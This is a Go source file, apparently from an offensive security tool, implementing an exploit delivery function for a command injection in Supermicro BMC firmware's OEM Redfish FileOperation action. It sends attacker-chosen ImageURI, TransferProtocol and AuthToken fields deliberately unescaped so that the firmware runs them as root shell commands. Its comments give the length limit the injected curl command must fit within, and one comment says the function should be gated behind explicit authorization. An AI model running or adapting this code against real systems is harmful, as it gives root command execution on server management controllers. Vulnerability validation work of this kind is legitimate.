package redfish

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"time"
)

// FileOperationPath is the Supermicro OEM Redfish action that interpolates the
// ImageURI, TransferProtocol and AuthToken JSON fields into root shell commands
// (SMC-0004; not reproduced by the vendor, no CVE assigned).
const FileOperationPath = "/redfish/v1/Managers/1/Oem/Supermicro/FileOperation"

// FileOpResult reports the outcome of a FileOperation action POST.
type FileOpResult struct {
	Status int
	Body   []byte
	OK     bool // 2xx (typically 202 Accepted; the sink is blind)
}

// PostFileOperation invokes the OEM FileOperation Import action. The three
// fields are sent verbatim - escaping them would defeat the injection being
// validated - so callers must keep the rendered curl command under the 0x180
// snprintf bound the firmware applies. headers must carry an authenticated
// principal (X-Auth-Token from OpenSession, or Authorization: Basic).
//
// This executes an OS command on the target as root; callers must gate it
// behind explicit authorization (the --apply-style opt-in lives in the cmd
// layer).
func PostFileOperation(client *http.Client, base, actionPath string, headers map[string]string,
	imageURI, transferProtocol, authToken string, timeout time.Duration) (FileOpResult, error) {
	if actionPath == "" {
		actionPath = FileOperationPath
	}
	payload := map[string]string{
		"ImageURI":         imageURI,
		"TransferProtocol": transferProtocol,
		"AuthToken":        authToken,
	}
	buf, err := json.Marshal(payload)
	if err != nil {
		return FileOpResult{}, err
	}

	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, base+actionPath, bytes.NewReader(buf))
	if err != nil {
		return FileOpResult{}, err
	}
	req.Header.Set("Content-Type", "application/json")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return FileOpResult{}, err
	}
	defer func() { _ = resp.Body.Close() }()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 262144))
	return FileOpResult{
		Status: resp.StatusCode,
		Body:   body,
		OK:     resp.StatusCode >= 200 && resp.StatusCode < 300,
	}, nil
}
